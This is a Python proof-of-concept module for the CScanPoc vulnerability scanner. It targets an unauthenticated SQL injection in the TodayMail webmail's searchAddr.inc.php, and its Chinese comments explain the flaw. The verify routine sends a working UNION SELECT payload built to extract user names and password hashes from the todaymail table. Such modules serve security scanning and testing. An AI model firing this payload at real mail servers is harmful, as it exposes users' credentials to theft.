# coding:utf-8
from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import time


class Vuln(ABVuln):
    vuln_id = 'TodayMail_0001'  # 平台漏洞编号
    name = 'TodayMail 无需登录SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2015-08-17'  # 漏洞公布时间
    desc = '''
        TodayMail时代企业邮箱是一款企业邮箱通讯系统。
        文件searchAddr.inc.php，可以看到这里没有包含登录验证的文件，所以可以无需登录即可直接访问。
        文件emailcore.class.inc.php，变量$value直接进入select sql语句了，没有进行任何过滤处理，导致SQL注入漏洞产生。
    '''  # 漏洞描述
    ref = 'http://0day5.com/archives/3482/'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'TodayMail'  # 漏洞组件名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'c7e31939-c1ba-4ca9-aff3-1d57536aab7d'  # 平台 POC 编号
    author = '47bwy'  # POC编写者
    create_date = '2018-06-25'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            payload = "/webmail/main/searchAddr.inc.php?value=123%%27)%20union%20select%20concat(tm_name,0x23,md5(c)),tm_passwd%20from%20todaymail%20limit%200,1000%23&ftm_id=103361"
            url = self.target + payload
            r = requests.get(url)

            if '4a8a08f09d37b73795649038408b5f33' in r.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常：{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
